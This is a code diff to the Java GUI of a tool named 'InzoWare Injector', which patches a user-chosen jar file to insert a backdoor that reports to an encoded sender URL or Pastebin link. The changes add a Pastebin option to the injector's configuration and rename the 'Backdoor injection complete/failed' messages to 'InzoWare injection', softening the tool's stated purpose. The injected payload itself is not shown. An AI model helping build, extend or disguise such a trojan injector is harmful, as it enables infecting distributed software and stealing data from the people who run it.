@@ -6,10 +6,11 @@ import javax.swing.filechooser.FileFilter;
 import java.io.File;
 import com.formdev.flatlaf.FlatDarkLaf;
 import java.util.Base64;
+import javassist.NotFoundException;
 
 public class InjectorGUI{
 
-    public static void main(String[] args){
+    public static void main(String[] args) throws NotFoundException{
         try {
             UIManager.setLookAndFeel(new FlatDarkLaf());
         }catch(Throwable ignored){}
@@ -79,7 +80,7 @@ public class InjectorGUI{
         String URLlist;
 
         int sender = JOptionPane.showConfirmDialog(null, "Do you Want A Pastebin URL?", "Inzo Ware Injector", JOptionPane.YES_NO_OPTION);
-        pastebinurl = sender == JOptionPane.YES_OPTION;
+         pastebinurl = sender == JOptionPane.YES_OPTION;
 
         URLlist = (String)JOptionPane.showInputDialog(
                 null,
@@ -110,13 +111,13 @@ public class InjectorGUI{
 
         System.out.println("[INFO] The Path Of The Main Class Is: " + MainClass);
 
-        Injector.SimpleConfig sc = new Injector.SimpleConfig(encodedSenderURL, MainClass);
+        Injector.SimpleConfig sc = new Injector.SimpleConfig(pastebinurl, encodedSenderURL, MainClass);
         boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, false);
 
         if(result2){
-            JOptionPane.showMessageDialog(null, "Backdoor injection complete.\nIf this project helped you, considering starring it on GitHub.", "Inzo Ware Injector", JOptionPane.INFORMATION_MESSAGE);
+            JOptionPane.showMessageDialog(null, "InzoWare injection complete.\nIf this project helped you, considering starring it on GitHub.", "Inzo Ware Injector", JOptionPane.INFORMATION_MESSAGE);
         }else{
-            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.", "Inzo Ware Injector", JOptionPane.ERROR_MESSAGE);
+            JOptionPane.showMessageDialog(null, "InzoWare injection failed.\nPlease create a GitHub issue report if necessary.", "Inzo Ware Injector", JOptionPane.ERROR_MESSAGE);
         }
 
     }
